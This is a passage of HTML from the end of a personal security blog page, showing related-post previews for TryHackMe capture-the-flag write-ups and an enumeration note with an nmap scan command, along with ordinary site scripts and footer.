href="/posts/online-safety/">How to stay safe online</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/nmap/">nmap</a> <a class="post-tag btn btn-outline-primary" href="/tags/enumeration/">enumeration</a> <a class="post-tag btn btn-outline-primary" href="/tags/base64/">base64</a> <a class="post-tag btn btn-outline-primary" href="/tags/gobuster/">gobuster</a> <a class="post-tag btn btn-outline-primary" href="/tags/gtfobins/">gtfobins</a> <a class="post-tag btn btn-outline-primary" href="/tags/ltrace/">ltrace</a> <a class="post-tag btn btn-outline-primary" href="/tags/r2/">r2</a> <a class="post-tag btn btn-outline-primary" href="/tags/radare2/">radare2</a> <a class="post-tag btn btn-outline-primary" href="/tags/ssh/">ssh</a> <a class="post-tag btn btn-outline-primary" href="/tags/strings/">strings</a></div></div></div><div id="toc-wrapper" class="ps-0 pe-4 mb-5"><div class="panel-heading ps-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-3 pe-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ms-1" data-toc-skip> Further Reading</h3><div class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><div class="col"> <a href="/posts/RootMe/" class="card post-preview h-100"><div class="card-body"> <em class="small" data-ts="1685566800" data-df="ll" > Jun 1, 2023 </em><h4 class="pt-0 my-2" data-toc-skip>Rootme</h4><div class="text-muted small"><p> Rootme is a fairly simple linux box. We shall start with nmap scan to see the ports open on the machine. We would then use gobuster for directory brute force and from there we would find where y...</p></div></div></a></div><div class="col"> <a href="/posts/Enumeration/" class="card post-preview h-100"><div class="card-body"> <em class="small" data-ts="1650834000" data-df="ll" > Apr 25, 2022 </em><h4 class="pt-0 my-2" data-toc-skip>Enumeration/Scanning</h4><div class="text-muted small"><p> This is the second phase of hacking where by it includes scanning the target and enumerating services. Port Scanning : 1. nmap -sC -sV -o nmap -A -T5 10.10.10.x 2. Host Discovery • nmap -sn 10...</p></div></div></a></div><div class="col"> <a href="/posts/Blue/" class="card post-preview h-100"><div class="card-body"> <em class="small" data-ts="1630098000" data-df="ll" > Aug 28, 2021 </em><h4 class="pt-0 my-2" data-toc-skip>BLUE</h4><div class="text-muted small"><p> This was my first write-up which I posted on Medium on Aug 28, 2021. Hello Everyone! I’m Collins, a security researcher. This is an article on how to exploit blue a machine on TryHackMe made b...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/you-cant-c-me/" class="btn btn-outline-primary" prompt="Older" ><p>You Can't see me</p></a> <a href="/posts/LazyAdmin/" class="btn btn-outline-primary" prompt="Newer" ><p>LazyAdmin</p></a></div><script type="text/javascript"> (function () { const origin = 'https://giscus.app'; const iframe = 'iframe.giscus-frame'; const lightTheme = 'light'; const darkTheme = 'dark_dimmed'; let initTheme = lightTheme; const html = document.documentElement; if ( (html.hasAttribute('data-mode') && html.getAttribute('data-mode') === 'dark') || (!html.hasAttribute('data-mode') && window.matchMedia('(prefers-color-scheme: dark)').matches) ) { initTheme = darkTheme; } let giscusAttributes = { src: 'https://giscus.app/client.js', 'data-repo': 'yrncollo/yrncollo.github.io', 'data-repo-id': 'R_kgDOHxZ4vg', 'data-category': 'Comments', 'data-category-id': 'DIC_kwDOHxZ4vs4CTH1E', 'data-mapping': 'url', 'data-reactions-enabled': '1', 'data-emit-metadata': '0', 'data-theme': initTheme, 'data-input-position': 'bottom', 'data-lang': 'en', crossorigin: 'anonymous', async: '' }; let giscusScript = document.createElement('script'); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value) ); document.getElementById('tail-wrapper').appendChild(giscusScript); addEventListener('message', (event) => { if ( event.source === window && event.data && event.data.direction === ModeToggle.ID ) { /* global theme mode changed */ const mode = event.data.message; const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme; const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); })(); </script></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/nmap/">nmap</a> <a class="post-tag btn btn-outline-primary" href="/tags/enumeration/">enumeration</a> <a class="post-tag btn btn-outline-primary" href="/tags/base64/">base64</a> <a class="post-tag btn btn-outline-primary" href="/tags/gobuster/">gobuster</a> <a class="post-tag btn btn-outline-primary" href="/tags/gtfobins/">gtfobins</a> <a class="post-tag btn btn-outline-primary" href="/tags/ltrace/">ltrace</a> <a class="post-tag btn btn-outline-primary" href="/tags/r2/">r2</a> <a class="post-tag btn btn-outline-primary" href="/tags/radare2/">radare2</a> <a class="post-tag btn btn-outline-primary" href="/tags/ssh/">ssh</a> <a class="post-tag btn btn-outline-primary" href="/tags/strings/">strings</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div></div><footer><div class="container px-lg-4"><div class="d-flex justify-content-center align-items-center text-muted mx-md-3"><p>Designed by YrnCollo</p><p>© 2024 <a href="https://twitter.com/Yrn_Collo">Collins Ng'eno</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.0/dist/jquery.min.js,npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.7/dayjs.min.js,npm/dayjs@1.11.7/locale/en.min.js,npm/dayjs@1.11.7/plugin/relativeTime.min.js,npm/dayjs@1.11.7/plugin/localizedFormat.min.js,npm/tocbot@4.21.0/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-SER319M631"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-SER319M631'); }); </script> <script> /* Note: dependent library will be loaded in `js-selector.html` */ SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="px-1 px-sm-2 px-lg-4 px-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
